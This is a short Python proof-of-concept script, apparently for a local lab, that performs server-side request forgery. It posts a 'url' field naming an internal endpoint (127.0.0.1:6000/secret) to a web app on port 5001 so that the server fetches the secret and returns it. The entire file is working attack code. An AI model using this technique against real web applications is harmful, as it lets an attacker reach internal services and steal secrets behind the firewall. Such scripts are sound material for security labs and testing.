import requests

TARGET = "http://127.0.0.1:5001/"
PAYLOAD = "http://127.0.0.1:6000/secret"

def run():
    data = {
        "url": PAYLOAD
    }

    r = requests.post(TARGET, data=data)

    print("=== Response ===")
    print(r.text)


if __name__ == "__main__":
    run()
